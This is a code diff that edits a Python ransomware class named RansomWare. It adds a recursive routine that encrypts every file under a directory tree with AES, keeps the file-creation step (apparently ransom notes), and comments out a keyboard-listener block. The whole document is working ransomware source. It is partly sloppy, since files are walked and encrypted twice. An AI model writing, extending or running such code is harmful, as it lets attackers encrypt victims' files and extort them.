@@ -1,7 +1,7 @@
+import os
 import time
 import threading
 from cryptography.fernet import Fernet
-from pynput import keyboard
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
@@ -11,7 +11,7 @@ class RansomWare:
         self.key = get_random_bytes(16)
         self.crypter = AES.new(self.key, AES.MODE_EAX)
         self.is_running = True
-        self.keyboard_listener()
+        # self.keyboard_listener()  # Commented out
         self.encrypt_all_files()
         self.create_files()
         self.is_running = False
@@ -21,7 +21,9 @@ class RansomWare:
             for file in files:
                 file_path = os.path.join(root, file)
                 self.encrypt_file(file_path)
-                self.delete_file(file_path)
+            for directory in dirs:
+                dir_path = os.path.join(root, directory)
+                self.encrypt_directory(dir_path)
 
     def encrypt_file(self, file_path):
         try:
@@ -32,6 +34,16 @@ class RansomWare:
                 f.write(encrypted_data)
         except Exception as e:
             print(f"Error encrypting {file_path}: {e}")
+
+    def encrypt_directory(self, dir_path):
+        try:
+            os.chdir(dir_path)
+            for root, dirs, files in os.walk(dir_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    self.encrypt_file(file_path)
+        except Exception as e:
+            print(f"Error encrypting directory {dir_path}: {e}")
 
     def delete_file(self, file_path):
         try:
@@ -48,19 +60,20 @@ class RansomWare:
             except Exception as e:
                 print(f"Error creating file {file_name}: {e}")
 
-    def keyboard_listener(self):
-        listener = keyboard.Listener(on_press=self.on_press)
-        listener.start()
-        listener.join()
+    # Commented out keyboard listener methods
+    # def keyboard_listener(self):
+    #     listener = keyboard.Listener(on_press=self.on_press)
+    #     listener.start()
+    #     listener.join()
 
-    def on_press(self, key):
-        try:
-            if key == keyboard.Key.alt or key == keyboard.Key.ctrl:
-                return False
-            if hasattr(key, 'char') and key.char == 'd':
-                return False
-        except Exception as e:
-            print(f"Error in keyboard listener: {e}")
+    # def on_press(self, key):
+    #     try:
+    #         if key == keyboard.Key.alt or key == keyboard.Key.ctrl:
+    #             return False
+    #         if hasattr(key, 'char') and key.char == 'd':
+    #             return False
+    #     except Exception as e:
+    #         print(f"Error in keyboard listener: {e}")
 
     def uninstall(self):
         try:
